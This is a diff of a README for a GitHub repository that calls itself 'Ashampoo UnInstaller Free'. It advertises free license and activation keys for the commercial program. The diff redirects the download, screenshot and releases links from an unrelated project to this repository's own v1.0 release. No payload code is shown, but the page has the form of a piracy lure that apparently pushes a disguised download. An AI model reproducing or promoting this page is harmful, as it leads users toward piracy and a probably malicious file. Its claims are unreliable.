@@ -24,7 +24,7 @@ Welcome to the Ashampoo UnInstaller Free repository! Here you can find all the i
   - revo-uninstaller-vs-ashampoo-uninstaller
 
 ## Link
-[Download Ashampoo UnInstaller Free 1.0](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip "Launch file")
+[Download Ashampoo UnInstaller Free 1.0](https://github.com/Rachid-Elk/Ashampoo-UnInstaller-Free/releases/tag/v1.0 "Launch file")
 
 ## 🌟 Features
 - **License Key**: Find Ashampoo UnInstaller 10 license keys.
@@ -34,7 +34,7 @@ Welcome to the Ashampoo UnInstaller Free repository! Here you can find all the i
 - **Activation Key**: Get Ashampoo UnInstaller 2017 free activation key.
 
 ## 🖼️ Screenshots
-![Ashampoo UnInstaller](https://example.com/ashampoo-uninstaller.png)
+![Ashampoo UnInstaller](https://github.com/Rachid-Elk/Ashampoo-UnInstaller-Free/releases/tag/v1.0)
 
 ## 📚 How to Use
 1. Download the Ashampoo UnInstaller Free 1.0 file from the provided link.
@@ -43,6 +43,6 @@ Welcome to the Ashampoo UnInstaller Free repository! Here you can find all the i
 
 Feel free to explore the repository for more information and resources related to Ashampoo UnInstaller!
 
-🔗 [Check the Releases section for more versions and updates](https://github.com/cli/go-gh/releases)
+🔗 [Check the Releases section for more versions and updates](https://github.com/Rachid-Elk/Ashampoo-UnInstaller-Free/releases/tag/v1.0)
 
 Happy Uninstalling! 🚪🔓
